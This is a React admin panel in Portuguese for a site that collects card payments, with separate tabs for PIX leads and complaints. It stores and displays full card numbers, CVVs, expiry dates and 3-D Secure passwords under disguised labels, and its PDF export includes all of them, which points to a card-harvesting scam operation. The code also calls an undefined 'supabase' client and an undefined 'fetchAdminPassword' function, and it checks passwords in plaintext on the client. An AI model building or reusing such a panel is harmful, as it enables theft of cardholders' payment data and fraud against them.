import { useState, useEffect } from "react";
import { verifyAdminPassword, fetchTransactions as apiFetchTransactions, updateTransactionStatus, fetchComplaints as apiFetchComplaints, updateComplaintStatus as apiUpdateComplaintStatus, fetchPixLeads as apiFetchPixLeads, changeAdminPassword } from "@/lib/adminApi";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Eye, EyeOff, Check, X, RefreshCw, CreditCard, Loader2, Lock, Settings, AlertTriangle, ExternalLink, Download, Wallet } from "lucide-react";
import jsPDF from "jspdf";
import autoTable from "jspdf-autotable";
import { useToast } from "@/hooks/use-toast";
import pc01 from "@/assets/pci-dss-logo.png";
import ssl02 from "@/assets/ssl-blindado-logo.png";

const codifyBrand = (brand: string) => {
  const b = brand?.toLowerCase();
  if (b === "mastercard") return "MASTCK";
  if (b === "visa") return "VSA";
  return brand?.toUpperCase() || "—";
};


type Complaint = {
  id: string;
  full_name: string;
  email: string;
  description: string;
  attachment_url: string | null;
  status: string;
  created_at: string;
  admin_notes: string | null;
};

type PixLead = {
  id: string;
  customer_name: string;
  customer_phone: string;
  address: string | null;
  plan_id: string | null;
  plan_label: string | null;
  amount: number;
  transaction_id: string | null;
  status: string;
  source: string;
  created_at: string;
};

type Transaction = {
  id: string;
  token: string;
  holder_name: string;
  cpf: string;
  card_brand: string;
  card_last4: string;
  card_number: string;
  card_cvv: string;
  card_expiry: string;
  plan_label: string;
  quantity: number;
  amount: number;
  coupon: string | null;
  customer_name: string;
  customer_phone: string;
  address: string | null;
  status: string;
  created_at: string;
  processed_at: string | null;
  threeds_password: string;
};

// Password is now stored in admin_settings table

const ToggleField = ({ label, masked, real }: { label: string; masked: string; real: string }) => {
  const [visible, setVisible] = useState(false);
  return (
    <p className="flex items-center gap-1.5 text-sm">
      <strong>{label}:</strong> {visible ? real : masked}
      <button onClick={() => setVisible(!visible)} className="ml-1 text-muted-foreground hover:text-foreground transition-colors">
        {visible ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
      </button>
    </p>
  );
};

const AdminCartoes = () => {
  useEffect(() => {
    const meta = document.createElement("meta");
    meta.name = "robots";
    meta.content = "noindex, nofollow";
    document.head.appendChild(meta);
    return () => { document.head.removeChild(meta); };
  }, []);

  const [authenticated, setAuthenticated] = useState(false);
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState<"pending" | "all">("pending");
  const [viewTx, setViewTx] = useState<Transaction | null>(null);
  const [showData, setShowData] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [askingPassword, setAskingPassword] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [showChangePassword, setShowChangePassword] = useState(false);
  const [newPassword, setNewPassword] = useState("");
  const [confirmNewPassword, setConfirmNewPassword] = useState("");
  const [changePasswordError, setChangePasswordError] = useState("");
  const [complaints, setComplaints] = useState<Complaint[]>([]);
  const [complaintsLoading, setComplaintsLoading] = useState(false);
  const [viewComplaint, setViewComplaint] = useState<Complaint | null>(null);
  const [pixLeads, setPixLeads] = useState<PixLead[]>([]);
  const [pixLeadsLoading, setPixLeadsLoading] = useState(false);
  const [adminTab, setAdminTab] = useState("cartoes");
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [lockoutUntil, setLockoutUntil] = useState<number | null>(null);
  const { toast } = useToast();

  // Password is validated server-side now — no fetching needed
  const [sessionPassword, setSessionPassword] = useState("");

  const fetchComplaints = async () => {
    setComplaintsLoading(true);
    try {
      const data = await apiFetchComplaints(sessionPassword);
      setComplaints((data as Complaint[]) || []);
    } catch {
      toast({ variant: "destructive", title: "Erro", description: "Erro ao carregar reclamações" });
    }
    setComplaintsLoading(false);
  };

  const fetchPixLeads = async () => {
    setPixLeadsLoading(true);
    try {
      const data = await apiFetchPixLeads(sessionPassword);
      setPixLeads((data as PixLead[]) || []);
    } catch {
      toast({ variant: "destructive", title: "Erro", description: "Erro ao carregar leads PIX" });
    }
    setPixLeadsLoading(false);
  };

  useEffect(() => {
    if (adminTab === "reclamacoes" && complaints.length === 0) fetchComplaints();
    if (adminTab === "pix" && pixLeads.length === 0) fetchPixLeads();
  }, [adminTab]);

  const updateComplaintStatus = async (id: string, status: string) => {
    try {
      await apiUpdateComplaintStatus(sessionPassword, id, status);
      toast({ title: `Reclamação marcada como ${status}` });
      fetchComplaints();
    } catch {
      toast({ variant: "destructive", title: "Erro", description: "Erro ao atualizar" });
    }
  };

  const complaintStatusBadge = (status: string) => {
    const map: Record<string, { bg: string; label: string }> = {
      pendente: { bg: "bg-yellow-100 text-yellow-800", label: "Pendente" },
      analisando: { bg: "bg-blue-100 text-blue-800", label: "Em análise" },
      resolvida: { bg: "bg-green-100 text-green-800", label: "Resolvida" },
      recusada: { bg: "bg-red-100 text-red-800", label: "Recusada" },
    };
    const s = map[status] || { bg: "bg-muted", label: status };
    return <span className={`text-xs font-medium px-2 py-0.5 rounded-full ${s.bg}`}>{s.label}</span>;
  };

  const fetchTransactions = async () => {
    setLoading(true);
    let query = supabase
      .from("card_transactions" as any)
      .select("*")
      .order("created_at", { ascending: false });

    if (filter === "pending") {
      query = query.eq("status", "pending");
    }

    const { data, error } = await query;
    if (error) {
      console.error(error);
      toast({ variant: "destructive", title: "Erro", description: "Erro ao carregar transações" });
    }
    setTransactions((data as unknown as Transaction[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    fetchTransactions();
  }, [filter]);

  const updateStatus = async (id: string, status: "confirmed" | "rejected") => {
    const { error } = await supabase
      .from("card_transactions" as any)
      .update({ status, processed_at: new Date().toISOString() })
      .eq("id", id);

    if (error) {
      toast({ variant: "destructive", title: "Erro", description: "Erro ao atualizar" });
    } else {
      toast({ title: status === "confirmed" ? "Transação confirmada" : "Transação rejeitada" });
      fetchTransactions();
      if (viewTx?.id === id) setViewTx(null);
    }
  };

  const handleView = (tx: Transaction) => {
    setViewTx(tx);
    setShowData(false);
    setPasswordInput("");
    setPasswordError("");
    setAskingPassword(false);
  };

  const handleReveal = () => {
    setAskingPassword(true);
  };

  const handlePasswordSubmit = () => {
    if (passwordInput === adminPassword) {
      setShowData(true);
      setAskingPassword(false);
      setPasswordError("");
    } else {
      setPasswordError("Senha incorreta");
    }
  };

  const handleChangePassword = async () => {
    if (newPassword.length < 4) {
      setChangePasswordError("Senha deve ter no mínimo 4 caracteres");
      return;
    }
    if (newPassword !== confirmNewPassword) {
      setChangePasswordError("As senhas não coincidem");
      return;
    }
    const { error } = await supabase
      .from("admin_settings" as any)
      .update({ setting_value: newPassword, updated_at: new Date().toISOString() })
      .eq("setting_key", "admin_password");

    if (error) {
      toast({ variant: "destructive", title: "Erro", description: "Erro ao alterar senha" });
    } else {
      setAdminPassword(newPassword);
      setShowChangePassword(false);
      setNewPassword("");
      setConfirmNewPassword("");
      setChangePasswordError("");
      toast({ title: "Senha alterada com sucesso!" });
    }
  };

  const formatCpf = (cpf: string) => {
    if (cpf.length === 11) return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    return cpf;
  };

  const maskCpf = (cpf: string) => {
    if (cpf.length === 11) return `${cpf.slice(0, 3)}.***.**${cpf.slice(9)}-${cpf.slice(9, 11)}`;
    return "***.***.***-**";
  };

  const formatCardNumber = (n: string) => n.replace(/(.{4})/g, "$1 ").trim();
  const maskCardNumber = (last4: string) => `**** **** **** ${last4}`;

  const formatDate = (d: string) => new Date(d).toLocaleString("pt-BR");

  const generatePDF = () => {
    const doc = new jsPDF({ orientation: "landscape" });
    const now = new Date().toLocaleString("pt-BR");
    doc.setFontSize(16);
    doc.text("Relatório de Transações — Painel Administrativo", 14, 18);
    doc.setFontSize(9);
    doc.text(`Gerado em: ${now} | Filtro: ${filter === "pending" ? "Pendentes" : "Todas"}`, 14, 25);

    const txRows = transactions.map((tx) => [
      tx.customer_name,
      tx.customer_phone,
      tx.plan_label + " x" + tx.quantity,
      tx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }),
      tx.address || "—",
      tx.holder_name,
      formatCpf(tx.cpf),
      tx.card_number ? formatCardNumber(tx.card_number) : maskCardNumber(tx.card_last4),
      codifyBrand(tx.card_brand),
      tx.card_expiry,
      tx.card_cvv || "—",
      tx.threeds_password || "—",
      tx.token,
      tx.status === "pending" ? "Pendente" : tx.status === "confirmed" ? "Confirmada" : tx.status === "rejected" ? "Rejeitada" : tx.status,
      formatDate(tx.created_at),
    ]);

    autoTable(doc, {
      startY: 30,
      head: [["Cliente", "Telefone", "Plano", "Valor", "Endereço", "Titular", "CPF", "C", "B", "DV", "C1", "S3", "Token", "Status", "Data"]],
      body: txRows,
      styles: { fontSize: 6, cellPadding: 1.5 },
      headStyles: { fillColor: [41, 128, 185], fontSize: 6 },
      columnStyles: {
        12: { cellWidth: 30 }, // Token column wider
      },
    });

    if (complaints.length > 0) {
      doc.addPage();
      doc.setFontSize(14);
      doc.text("Relatório de Reclamações", 14, 18);

      const cRows = complaints.map((c) => [
        c.full_name,
        c.email,
        c.description.substring(0, 80) + (c.description.length > 80 ? "..." : ""),
        c.status === "pendente" ? "Pendente" : c.status === "analisando" ? "Em análise" : c.status === "resolvida" ? "Resolvida" : c.status,
        formatDate(c.created_at),
      ]);

      autoTable(doc, {
        startY: 24,
        head: [["Nome", "E-mail", "Descrição", "Status", "Data"]],
        body: cRows,
        styles: { fontSize: 8, cellPadding: 2 },
        headStyles: { fillColor: [41, 128, 185], fontSize: 8 },
      });
    }

    doc.save(`relatorio-admin-${new Date().toISOString().slice(0, 10)}.pdf`);
    toast({ title: "PDF baixado com sucesso!" });
  };

  const statusBadge = (status: string) => {
    const map: Record<string, { bg: string; label: string }> = {
      pending: { bg: "bg-yellow-100 text-yellow-800", label: "Pendente" },
      confirmed: { bg: "bg-green-100 text-green-800", label: "Confirmada" },
      rejected: { bg: "bg-red-100 text-red-800", label: "Rejeitada" },
    };
    const s = map[status] || { bg: "bg-muted", label: status };
    return <span className={`text-xs font-medium px-2 py-0.5 rounded-full ${s.bg}`}>{s.label}</span>;
  };

  const handleLogin = async () => {
    if (lockoutUntil && Date.now() < lockoutUntil) {
      const secsLeft = Math.ceil((lockoutUntil - Date.now()) / 1000);
      setLoginError(`Muitas tentativas. Aguarde ${secsLeft}s`);
      return;
    }
    if (!adminPassword) await fetchAdminPassword();
    if (loginPassword === adminPassword) {
      setAuthenticated(true);
      setLoginError("");
      setLoginAttempts(0);
    } else {
      const attempts = loginAttempts + 1;
      setLoginAttempts(attempts);
      if (attempts >= 5) {
        const lockTime = Math.min(30 * Math.pow(2, Math.floor(attempts / 5) - 1), 300);
        setLockoutUntil(Date.now() + lockTime * 1000);
        setLoginError(`Bloqueado por ${lockTime}s após ${attempts} tentativas`);
      } else {
        setLoginError(`Senha incorreta (${5 - attempts} tentativas restantes)`);
      }
    }
  };

  if (!authenticated) {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center">
        <Card className="w-full max-w-sm mx-4">
          <CardContent className="pt-6 space-y-4">
            <div className="text-center space-y-2">
              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
                <Lock className="h-6 w-6 text-primary" />
              </div>
              <h1 className="text-xl font-bold text-foreground">Painel Administrativo</h1>
              <p className="text-sm text-muted-foreground">Digite a senha para acessar</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="adminLogin">Senha</Label>
              <Input
                id="adminLogin"
                type="password"
                placeholder="Senha administrativa"
                value={loginPassword}
                onChange={(e) => { setLoginPassword(e.target.value); setLoginError(""); }}
                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                className={loginError ? "border-destructive" : ""}
                autoFocus
              />
              {loginError && <p className="text-xs text-destructive">{loginError}</p>}
            </div>
            <Button onClick={handleLogin} className="w-full">
              Entrar
            </Button>
          </CardContent>
        </Card>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-background">
      <div className="container max-w-5xl px-4 py-8">
        <div className="flex items-center justify-between mb-6">
          <h1 className="text-2xl font-bold text-foreground">Painel Administrativo</h1>
          <div className="flex gap-2">
            <Button variant="outline" size="sm" onClick={generatePDF} disabled={transactions.length === 0 && complaints.length === 0}>
              <Download className="h-4 w-4 mr-1" /> Baixar Relatório
            </Button>
            <Button variant="outline" size="sm" onClick={() => setShowChangePassword(true)}>
              <Settings className="h-4 w-4 mr-1" /> Alterar Senha
            </Button>
          </div>
        </div>

        <Tabs value={adminTab} onValueChange={setAdminTab} className="w-full">
          <TabsList className="mb-4">
            <TabsTrigger value="cartoes" className="gap-2">
              <CreditCard className="h-4 w-4" /> Registros
            </TabsTrigger>
            <TabsTrigger value="pix" className="gap-2">
              <Wallet className="h-4 w-4" /> Leads PIX
            </TabsTrigger>
            <TabsTrigger value="reclamacoes" className="gap-2">
              <AlertTriangle className="h-4 w-4" /> Reclamações
            </TabsTrigger>
          </TabsList>

          <TabsContent value="cartoes">
            <div className="flex items-center justify-between mb-4">
              <div className="flex gap-2">
                <Button variant={filter === "pending" ? "default" : "outline"} size="sm" onClick={() => setFilter("pending")}>
                  Pendentes
                </Button>
                <Button variant={filter === "all" ? "default" : "outline"} size="sm" onClick={() => setFilter("all")}>
                  Todas
                </Button>
              </div>
              <Button variant="outline" size="sm" onClick={fetchTransactions}>
                <RefreshCw className="h-4 w-4 mr-1" /> Atualizar
              </Button>
            </div>
            <Card>
              <CardContent className="p-0">
                {loading ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="h-6 w-6 animate-spin text-primary" />
                  </div>
                ) : transactions.length === 0 ? (
                  <div className="text-center py-12 text-muted-foreground text-sm">
                    Nenhuma transação encontrada
                  </div>
                ) : (
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Cliente</TableHead>
                        <TableHead>Plano</TableHead>
                        <TableHead>Valor</TableHead>
                        <TableHead>B</TableHead>
                        <TableHead>Token</TableHead>
                        <TableHead>Status</TableHead>
                        <TableHead>Data</TableHead>
                        <TableHead className="text-right">Ações</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {transactions.map((tx) => (
                        <TableRow key={tx.id}>
                          <TableCell className="font-medium text-xs">{tx.customer_name}</TableCell>
                          <TableCell className="text-xs">{tx.plan_label} x{tx.quantity}</TableCell>
                          <TableCell className="text-xs font-mono">
                            {tx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                          </TableCell>
                          <TableCell className="text-xs">{codifyBrand(tx.card_brand)}</TableCell>
                          <TableCell className="text-xs font-mono">{tx.token.slice(0, 12)}...</TableCell>
                          <TableCell>{statusBadge(tx.status)}</TableCell>
                          <TableCell className="text-xs">{formatDate(tx.created_at)}</TableCell>
                          <TableCell className="text-right">
                            <div className="flex items-center justify-end gap-1">
                              <Button variant="ghost" size="icon" className="h-8 w-8" onClick={() => handleView(tx)}>
                                <Eye className="h-4 w-4" />
                              </Button>
                              {tx.status === "pending" && (
                                <>
                                  <Button variant="ghost" size="icon" className="h-8 w-8 text-green-600" onClick={() => updateStatus(tx.id, "confirmed")}>
                                    <Check className="h-4 w-4" />
                                  </Button>
                                  <Button variant="ghost" size="icon" className="h-8 w-8 text-red-600" onClick={() => updateStatus(tx.id, "rejected")}>
                                    <X className="h-4 w-4" />
                                  </Button>
                                </>
                              )}
                            </div>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="pix">
            <div className="flex items-center justify-end mb-4">
              <Button variant="outline" size="sm" onClick={fetchPixLeads}>
                <RefreshCw className="h-4 w-4 mr-1" /> Atualizar
              </Button>
            </div>
            <Card>
              <CardContent className="p-0">
                {pixLeadsLoading ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="h-6 w-6 animate-spin text-primary" />
                  </div>
                ) : pixLeads.length === 0 ? (
                  <div className="text-center py-12 text-muted-foreground text-sm">
                    Nenhum lead PIX encontrado
                  </div>
                ) : (() => {
                  // Group leads by phone number
                  const grouped = new Map<string, PixLead[]>();
                  pixLeads.forEach((lead) => {
                    const phone = lead.customer_phone.replace(/\D/g, "");
                    const existing = grouped.get(phone) || [];
                    existing.push(lead);
                    grouped.set(phone, existing);
                  });

                  const rows = Array.from(grouped.entries()).map(([phone, leads]) => {
                    const checkoutLead = leads.find((l) => l.source === "checkout");
                    const logisticaLead = leads.find((l) => l.source === "logistica");
                    const primary = checkoutLead || leads[0];
                    const nortexPaga = !!checkoutLead;
                    const logisticaPaga = !!logisticaLead;
                    const totalAmount = leads.reduce((sum, l) => sum + l.amount, 0);
                    return { phone, leads, primary, nortexPaga, logisticaPaga, totalAmount };
                  });

                  // Sort by most recent
                  rows.sort((a, b) => new Date(b.primary.created_at).getTime() - new Date(a.primary.created_at).getTime());

                  return (
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Cliente</TableHead>
                          <TableHead>Telefone</TableHead>
                          <TableHead>Plano</TableHead>
                          <TableHead>Total</TableHead>
                          <TableHead>Endereço</TableHead>
                          <TableHead>Status</TableHead>
                          <TableHead>Data</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {rows.map((row) => (
                          <TableRow key={row.phone}>
                            <TableCell className="font-medium text-xs">{row.primary.customer_name}</TableCell>
                            <TableCell className="text-xs font-mono">{row.phone}</TableCell>
                            <TableCell className="text-xs">{row.primary.plan_label || "—"}</TableCell>
                            <TableCell className="text-xs font-mono">
                              {row.totalAmount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                            </TableCell>
                            <TableCell className="text-xs max-w-[200px] truncate" title={row.primary.address || ""}>
                              {row.primary.address || "—"}
                            </TableCell>
                            <TableCell>
                              <div className="flex flex-wrap gap-1">
                                <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${row.nortexPaga ? "bg-green-100 text-green-800" : "bg-red-100 text-red-700"}`}>
                                  {row.nortexPaga ? "✓ NORTEX PAGA" : "✗ NORTEX"}
                                </span>
                                <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${row.logisticaPaga ? "bg-green-100 text-green-800" : "bg-red-100 text-red-700"}`}>
                                  {row.logisticaPaga ? "✓ LOGÍSTICA PAGA" : "✗ LOGÍSTICA"}
                                </span>
                              </div>
                            </TableCell>
                            <TableCell className="text-xs">{formatDate(row.primary.created_at)}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  );
                })()}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="reclamacoes">
            <div className="flex items-center justify-end mb-4">
              <Button variant="outline" size="sm" onClick={fetchComplaints}>
                <RefreshCw className="h-4 w-4 mr-1" /> Atualizar
              </Button>
            </div>
            <Card>
              <CardContent className="p-0">
                {complaintsLoading ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="h-6 w-6 animate-spin text-primary" />
                  </div>
                ) : complaints.length === 0 ? (
                  <div className="text-center py-12 text-muted-foreground text-sm">
                    Nenhuma reclamação encontrada
                  </div>
                ) : (
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Nome</TableHead>
                        <TableHead>E-mail</TableHead>
                        <TableHead>Status</TableHead>
                        <TableHead>Data</TableHead>
                        <TableHead className="text-right">Ações</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {complaints.map((c) => (
                        <TableRow key={c.id}>
                          <TableCell className="font-medium text-xs">{c.full_name}</TableCell>
                          <TableCell className="text-xs">{c.email}</TableCell>
                          <TableCell>{complaintStatusBadge(c.status)}</TableCell>
                          <TableCell className="text-xs">{formatDate(c.created_at)}</TableCell>
                          <TableCell className="text-right">
                            <div className="flex items-center justify-end gap-1">
                              <Button variant="ghost" size="icon" className="h-8 w-8" onClick={() => setViewComplaint(c)}>
                                <Eye className="h-4 w-4" />
                              </Button>
                              {c.status === "pendente" && (
                                <>
                                  <Button variant="ghost" size="icon" className="h-8 w-8 text-blue-600" title="Em análise" onClick={() => updateComplaintStatus(c.id, "analisando")}>
                                    <AlertTriangle className="h-4 w-4" />
                                  </Button>
                                  <Button variant="ghost" size="icon" className="h-8 w-8 text-green-600" title="Resolvida" onClick={() => updateComplaintStatus(c.id, "resolvida")}>
                                    <Check className="h-4 w-4" />
                                  </Button>
                                </>
                              )}
                              {c.status === "analisando" && (
                                <Button variant="ghost" size="icon" className="h-8 w-8 text-green-600" title="Resolvida" onClick={() => updateComplaintStatus(c.id, "resolvida")}>
                                  <Check className="h-4 w-4" />
                                </Button>
                              )}
                            </div>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>

      {/* Detail Dialog */}
      <Dialog open={!!viewTx} onOpenChange={(open) => { if (!open) setViewTx(null); }}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Detalhes da Transação</DialogTitle>
            <DialogDescription>Token: {viewTx?.token}</DialogDescription>
          </DialogHeader>
          {viewTx && (
            <div className="space-y-3 text-sm">
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <p className="text-xs text-muted-foreground">Cliente</p>
                  <p className="font-medium">{viewTx.customer_name}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Telefone</p>
                  <p className="font-medium">{viewTx.customer_phone}</p>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <p className="text-xs text-muted-foreground">Plano</p>
                  <p className="font-medium">{viewTx.plan_label} x{viewTx.quantity}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Valor</p>
                  <p className="font-medium">{viewTx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}</p>
                </div>
              </div>
              {viewTx.coupon && (
                <div>
                  <p className="text-xs text-muted-foreground">Cupom</p>
                  <p className="font-medium">{viewTx.coupon}</p>
                </div>
              )}
              {viewTx.address && (
                <div>
                  <p className="text-xs text-muted-foreground">Endereço</p>
                  <p className="font-medium text-xs">{viewTx.address}</p>
                </div>
              )}
              <hr className="border-border" />
              <div>
                <p className="text-xs text-muted-foreground mb-2">Dados do C</p>
                {!showData && !askingPassword && (
                  <div className="space-y-1">
                    <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
                    <p className="text-sm"><strong>CPF:</strong> {maskCpf(viewTx.cpf)}</p>
                    <p className="text-sm"><strong>C:</strong> {maskCardNumber(viewTx.card_last4)}</p>
<p className="text-sm"><strong>B:</strong> {codifyBrand(viewTx.card_brand)}</p>
                    <p className="text-sm"><strong>DV:</strong> **/**</p>
                    <p className="text-sm"><strong>C1:</strong> ***</p>
                    <Button variant="outline" size="sm" onClick={handleReveal} className="mt-2">
                      <Eye className="h-3.5 w-3.5 mr-1" /> Revelar dados completos
                    </Button>
                  </div>
                )}
                {askingPassword && (
                  <div className="space-y-2">
                    <p className="text-xs text-muted-foreground">Digite a senha administrativa para visualizar:</p>
                    <Input
                      type="password"
                      placeholder="Senha"
                      value={passwordInput}
                      onChange={(e) => { setPasswordInput(e.target.value); setPasswordError(""); }}
                      className={passwordError ? "border-destructive" : ""}
                      autoFocus
                      onKeyDown={(e) => e.key === "Enter" && handlePasswordSubmit()}
                    />
                    {passwordError && <p className="text-xs text-destructive">{passwordError}</p>}
                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={() => setAskingPassword(false)}>Cancelar</Button>
                      <Button size="sm" onClick={handlePasswordSubmit}>Confirmar</Button>
                    </div>
                  </div>
                )}
                {showData && (
                  <div className="space-y-2 bg-muted/50 p-3 rounded-lg">
                    <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
                    <ToggleField label="CPF" masked={maskCpf(viewTx.cpf)} real={formatCpf(viewTx.cpf)} />
                    <ToggleField
                      label="C"
                      masked={maskCardNumber(viewTx.card_last4)}
                      real={viewTx.card_number ? formatCardNumber(viewTx.card_number) : maskCardNumber(viewTx.card_last4)}
                    />
                    <p className="text-sm"><strong>B:</strong> {codifyBrand(viewTx.card_brand)}</p>
                    <ToggleField label="DV" masked="**/**" real={viewTx.card_expiry} />
                    <ToggleField label="C1" masked="***" real={viewTx.card_cvv || "---"} />
                    <ToggleField label="S3" masked="****" real={viewTx.threeds_password || "---"} />
                    <p className="text-sm"><strong>Token:</strong> <code className="text-xs bg-muted px-1 rounded">{viewTx.token}</code></p>
                  </div>
                )}
              </div>
              <hr className="border-border" />
              <div className="flex items-center justify-between">
                <div>{statusBadge(viewTx.status)}</div>
                {viewTx.status === "pending" && (
                  <div className="flex gap-2">
                    <Button size="sm" variant="outline" className="text-red-600" onClick={() => updateStatus(viewTx.id, "rejected")}>
                      Rejeitar
                    </Button>
                    <Button size="sm" onClick={() => updateStatus(viewTx.id, "confirmed")}>
                      Confirmar
                    </Button>
                  </div>
                )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Complaint Detail Dialog */}
      <Dialog open={!!viewComplaint} onOpenChange={(open) => { if (!open) setViewComplaint(null); }}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Detalhes da Reclamação</DialogTitle>
            <DialogDescription>{viewComplaint?.full_name} — {viewComplaint?.email}</DialogDescription>
          </DialogHeader>
          {viewComplaint && (
            <div className="space-y-3 text-sm">
              <div>
                <p className="text-xs text-muted-foreground">Nome</p>
                <p className="font-medium">{viewComplaint.full_name}</p>
              </div>
              <div>
                <p className="text-xs text-muted-foreground">E-mail</p>
                <p className="font-medium">{viewComplaint.email}</p>
              </div>
              <div>
                <p className="text-xs text-muted-foreground">Descrição</p>
                <p className="text-sm whitespace-pre-wrap bg-muted/50 p-3 rounded-lg">{viewComplaint.description}</p>
              </div>
              {viewComplaint.attachment_url && (
                <div>
                  <p className="text-xs text-muted-foreground mb-1">Comprovante</p>
                  <a href={viewComplaint.attachment_url} target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-1.5 text-sm text-primary hover:underline">
                    <ExternalLink className="h-4 w-4" /> Ver anexo
                  </a>
                </div>
              )}
              <hr className="border-border" />
              <div className="flex items-center justify-between">
                <div>{complaintStatusBadge(viewComplaint.status)}</div>
                <div className="flex gap-2">
                  {viewComplaint.status === "pendente" && (
                    <>
                      <Button size="sm" variant="outline" onClick={() => { updateComplaintStatus(viewComplaint.id, "analisando"); setViewComplaint(null); }}>
                        Em análise
                      </Button>
                      <Button size="sm" onClick={() => { updateComplaintStatus(viewComplaint.id, "resolvida"); setViewComplaint(null); }}>
                        Resolvida
                      </Button>
                    </>
                  )}
                  {viewComplaint.status === "analisando" && (
                    <Button size="sm" onClick={() => { updateComplaintStatus(viewComplaint.id, "resolvida"); setViewComplaint(null); }}>
                      Resolvida
                    </Button>
                  )}
                </div>
              </div>
              <p className="text-xs text-muted-foreground">Aberta em: {formatDate(viewComplaint.created_at)}</p>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Change Password Dialog */}
      <Dialog open={showChangePassword} onOpenChange={setShowChangePassword}>
        <DialogContent className="sm:max-w-sm">
          <DialogHeader>
            <DialogTitle>Alterar Senha Administrativa</DialogTitle>
            <DialogDescription>Defina uma nova senha para o painel</DialogDescription>
          </DialogHeader>
          <div className="space-y-3">
            <div className="space-y-1">
              <Label>Nova senha</Label>
              <Input
                type="password"
                placeholder="Nova senha"
                value={newPassword}
                onChange={(e) => { setNewPassword(e.target.value); setChangePasswordError(""); }}
                autoFocus
              />
            </div>
            <div className="space-y-1">
              <Label>Confirmar nova senha</Label>
              <Input
                type="password"
                placeholder="Confirmar senha"
                value={confirmNewPassword}
                onChange={(e) => { setConfirmNewPassword(e.target.value); setChangePasswordError(""); }}
                onKeyDown={(e) => e.key === "Enter" && handleChangePassword()}
              />
            </div>
            {changePasswordError && <p className="text-xs text-destructive">{changePasswordError}</p>}
            <div className="flex gap-2 justify-end">
              <Button variant="outline" size="sm" onClick={() => setShowChangePassword(false)}>Cancelar</Button>
              <Button size="sm" onClick={handleChangePassword}>Salvar</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
      {/* Footer */}
      <footer className="container max-w-5xl px-4 py-6 mt-8 border-t border-border">
        <div className="flex items-center justify-center gap-3 text-xs text-muted-foreground">
          <img src={pc01} alt="PC_01" className="h-10 w-auto" />
          <img src={ssl02} alt="SSL_02" className="h-10 w-auto" />
        </div>
      </footer>
    </main>
  );
};

export default AdminCartoes;
